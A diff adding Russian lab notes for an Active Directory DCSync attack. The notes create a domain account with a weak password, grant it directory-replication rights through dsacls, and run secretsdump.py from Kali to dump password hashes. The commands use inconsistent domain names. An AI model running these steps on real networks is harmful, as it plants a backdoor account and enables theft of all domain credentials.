@@ -1,0 +1,13 @@
+DC:
+создаем поользователя
+net user svc_replicator P@ssw0rd /add /domain
+
+Выдаем права на репликацию 
+dsacls "dc=test,dc=local" /G "TEST\svc_replicator:CA;Replicating Directory Changes"
+dsacls "dc=test,dc=local" /G "TEST\svc_replicator:CA;Replicating Directory Changes All" 
+Replicating Directory Changes — имя расширенного права, которое разрешает запрашивать репликацию изменений каталога.
+Replicating Directory Changes All - дополнительно позволяет реплицировать учётные записи, скрытые от обычной репликации (например, хэши из атрибута unicodePwd)
+
+
+Kali linux:
+secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10
